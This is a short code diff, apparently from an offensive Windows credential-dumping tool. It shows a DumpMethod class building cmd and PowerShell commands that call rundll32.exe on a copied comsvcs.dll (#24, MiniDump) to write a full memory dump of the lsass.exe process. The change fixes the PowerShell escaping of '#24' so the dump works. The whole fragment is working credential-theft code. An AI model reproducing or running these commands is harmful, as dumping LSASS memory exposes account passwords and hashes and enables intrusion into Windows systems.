@@ -37,7 +37,7 @@ class DumpMethod(IDumpMethod):
         cmd_command = """for /f "tokens=1,2 delims= " ^%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do rundll32.exe C:{}{} #24 ^%B {}{} full""".format(
             self.comsvcs_copy_path, self.comsvcs_copy_name, self.dump_path, self.dump_name
         )
-        pwsh_command = """rundll32.exe C:{}{} #24 (Get-Process lsass).Id {}{} full""".format(
+        pwsh_command = """rundll32.exe C:{}{} `#24 (Get-Process lsass).Id {}{} full""".format(
              self.comsvcs_copy_path, self.comsvcs_copy_name, self.dump_path, self.dump_name
         )
         return {
